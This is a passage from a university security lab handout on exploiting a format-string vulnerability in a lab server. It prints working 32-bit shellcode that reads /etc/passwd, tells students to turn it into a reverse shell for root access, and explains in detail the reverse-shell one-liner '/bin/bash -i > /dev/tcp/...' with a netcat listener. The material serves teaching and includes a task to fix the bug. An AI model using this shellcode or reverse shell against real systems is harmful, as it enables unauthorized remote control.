- Question 1: What are the memory addresses at the locations marked by Ë and Ì?
- Question 2: How many %x format specifiers do we need to move the format string argument pointer to Ì? Remember, the argument pointer starts from the location above Ê.

### 6.2 Shellcode

Shellcode is typically used in code injection attacks. It is basically a piece of code that launches a shell, and is usually written in assembly languages. In this lab, we only provide the binary version of a generic shellcode, without explaining how it works, because it is non-trivial. Our generic shellcode is listed in the following (we only list the 32-bit version):

```python
shellcode = (
    "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
    "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
    "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
    "/bin/bash\*"
    "-c\*"
    "/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd \*"

    # The * in this line serves as the position marker
    "AAAA" # Placeholder for argv[0] --> "/bin/bash"
    "BBBB" # Placeholder for argv[1] --> "-c"
    "CCCC" # Placeholder for argv[2] --> the command string
    "DDDD" # Placeholder for argv[3] --> NULL
).encode('latin-1')
```

The shellcode runs the "/bin/bash" shell program (Line 1), but it is given two arguments, "-c" (Line 2) and a command string (Line 3). This indicates that the shell program will run the commands in the second argument. The \* at the end of these strings is only a placeholder, and it will be replaced by one byte of 0x00 during the execution of the shellcode. Each string needs to have a zero at the end, but we cannot put zeros in the shellcode. Instead, we put a placeholder at the end of each string, and then dynamically put a zero in the placeholder during the execution.

If we want the shellcode to run some other commands, we just need to modify the command string in Line 3. However, when making changes, we need to make sure not to change the length of this string, because the starting position of the placeholder for the argv[] array, which is right after the command string, is hardcoded in the binary portion of the shellcode. If we change the length, we need to modify the binary part. To keep the star at the end of this string at the same position, you can add or delete spaces.

Both 32-bit and 64-bit versions of shellcode are included in the exploit.py inside the attack-code folder. You can use them to build your format strings.

### 6.3 Your Task

Please construct your input, feed it to the server program, and demonstrate that you can successfully get the server to run your shellcode. In your lab report, you need to explain how your format string is constructed. Please mark on Figure 1 where your malicious code is stored (please provide the concrete address).

Getting a Reverse Shell. We are not interested in running some pre-determined commands. We want to get a root shell on the target server, so we can type any command we want. Since we are on a remote machine, if we simply get the server to run /bin/bash, we won't be able to control the shell program. Reverse shell is a typical technique to solve this problem. Section 9 provides detailed instructions on how to run a reverse shell. Please modify the command string in your shellcode, so you can get a reverse shell on the target server. Please include screenshots and explanation in your lab report.

Refer to Section 9 in this README ("Informational Guidelines on Reverse Shell") as well Chapter 9 in the recommended textbook for more information about reverse shells.

# 7) Task 5: Attacking the 64-bit Server Program
---
In the previous tasks, our target servers are 32-bit programs. In this task, we switch to a 64-bit server program. Our new target is 10.9.0.6, which runs the 64-bit version of the format program. Let's first send a hello message to this server. We will see the following messages printed out by the target container.

```bash
$ echo hello | nc 10.9.0.6 9090
Press Ctrl+C

// Printouts on the container's console
server-10.9.0.6 | Got a connection from 10.9.0.1
server-10.9.0.6 | Starting format
server-10.9.0.6 | Input buffer (address): 0x00007fffffffe200
server-10.9.0.6 | The secret message's address: 0x0000555555556008
server-10.9.0.6 | The target variable's address: 0x0000555555558010
server-10.9.0.6 | Input size: 6
server-10.9.0.6 | Frame Pointer (inside myprintf): 0x00007fffffffe140
server-10.9.0.6 | The target variable's value (before): 0x1122334455667788 
server-10.9.0.6 | hello
server-10.9.0.6 | (ˆ\_ˆ)(ˆ\_ˆ) Returned from printf() (ˆ\_ˆ)(ˆ\_ˆ)
server-10.9.0.6 | The target variable's value (after): 0x1122334455667788
```

You can see the values of the frame pointer and buffer's address become 8 bytes long (instead of 4 bytes in 32-bit programs). Your job is to construct your payload to exploit the format-string vulnerability of the server. You ultimate goal is to get a root shell on the target server. You need to use the 64-bit version of the shellcode.

Challenges caused by 64-bit Address. A challenge caused by the x64 architecture is the zeros in the address. Although the x64 architecture supports 64-bit address space, only the address from 0x00 through 0x00007FFFFFFFFFFF is allowed. That means for every address (8 bytes), the highest two bytes are always zeros. This causes a problem.

In the attack, we need to place addresses inside the format string. For 32-bit programs, we can put the addresses anywhere, because there are no zeros inside the address. We can no longer do this for the 64-bit programs. If you put an address in the middle of your format string, when printf() parses the format string, it will stop the parsing when it sees a zero. Basically, anything after the first zero in a format string will not be considered as part of the format string.

The problem caused by zeros is different from that in the buffer overflow attack, in which, zeros will terminate the memory copy if strpcy() is used. Here, we do not have memory copy in the program, so we can have zeros in our input, but where to put them is critical. There are many ways to solve this problem, and we leave this to students. In the lab report, students should explain how they have solved this problem.

A userful technique: moving the argument pointer freely. In a format string, we can use %x to move the argument pointer valist to the next optional arguments. We can also directly move the pointer to the k-th optional argument. This is done using the format string's parameter field (in the form of k$). The following code example uses "%3$.20x" to print out the value of the 3rd optional argument (number 3), and then uses "%6$n" to write a value to the 6th optional argument (the variable var, its value will become 20). Finally, using %2$.10x, it moves the pointer back to the 2nd optional argument (number 2), and print it out. You can see, using this method, we can move the pointer freely back and forth. This technique can be quite useful to simplify the construction of the format string in this task.

```c
#include <stdio.h>
int main(){
    int var = 1000;
    printf("%3$.20x%6$n%2$.10x\n", 1, 2, 3, 4, 5, &var);
    printf("The value in var: %d\n",var); return 0;
}
```
_Output_
```
nyuappsec@ubuntu:$ a.out
000000000000000000030000000002
The value in var: 20
```
---
## 8) Task 6: Fixing the Problem
---
Remember the warning message generated by the gcc compiler? Please explain what it means. Please fix the vulnerability in the server program, and recompile it. Does the compiler warning go away? Do your attacks still work? You only need to try one of your attacks to see whether it still works or not.

---
## 9) Informational Guidelines on Reverse Shell
---
The key idea of reverse shell is to redirect its standard input, output, and error devices to a network connection, so the shell gets its input from the connection, and prints out its output also to the connection. At the other end of the connection is a program run by the attacker; the program simply displays whatever comes from the shell at the other end, and sends whatever is typed by the attacker to the shell, over the network connection.

A commonly used program by attackers is netcat, which, if running with the "-l" option, becomes a TCP server that listens for a connection on the specified port. This server program basically prints out whatever is sent by the client, and sends to the client whatever is typed by the user running the server. In the following experiment, netcat (nc for short) is used to listen for a connection on port 9090 (let us focus only on the first line).

```bash
Attacker(10.0.2.6):$ nc -nv -l 9090 # Waiting for reverse shell
Listening on 0.0.0.0 9090Connection received on 10.0.2.5 39452
Server(10.0.2.5):$  # Reverse shell from 10.0.2.5.
Server(10.0.2.5):$ ifconfig
ifconfig enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 10.0.2.5 netmask 255.255.255.0 broadcast 10.0.2.255 ...
```

The above nc command will block, waiting for a connection. We now directly run the following bash program on the Server machine (10.0.2.5) to emulate what attackers would run after compromising the server via the Shellshock attack. This bash command will trigger a TCP connection to the attacker machine's port 9090, and a reverse shell will be created. We can see the shell prompt from the above result, indicating that the shell is running on the Server machine; we can type the ifconfig command to verify that the IP address is indeed 10.0.2.5, the one belonging to the Server machine. Here is the bash command:
```
Server(10.0.2.5):$ /bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1
```
The above command represents the one that would normally be executed on a compromised server. It is quite complicated, and we give a detailed explanation in the following:

- "/bin/bash -i": The option i stands for interactive, meaning that the shell must be interactive (must provide a shell prompt).
- "> /dev/tcp/10.0.2.6/9090": This causes the output device (stdout) of the shell to be redirected to the TCP connection to 10.0.2.6's port 9090. In Unix systems, stdout's file descriptor is 1.
- "0<&1": File descriptor 0 represents the standard input device (stdin). This option tells the system to use the standard output device as the stardard input device. Since stdout is already redirected to the TCP connection, this option basically indicates that the shell program will get its input from the same TCP connection.
- "2>&1": File descriptor 2 represents the standard error stderr. This causes the error output to be redirected to stdout, which is the TCP connection.

In summary, the command "/bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1" starts a bash shell on the server machine, with its input coming from a TCP connection, and output going to the same TCP connection. In our experiment, when the bash shell command is executed on 10.0.2.5, it connects back to the netcat process started on 10.0.2.6. This is confirmed via the "Connection from 10.0.2.5 ..." message displayed by netcat.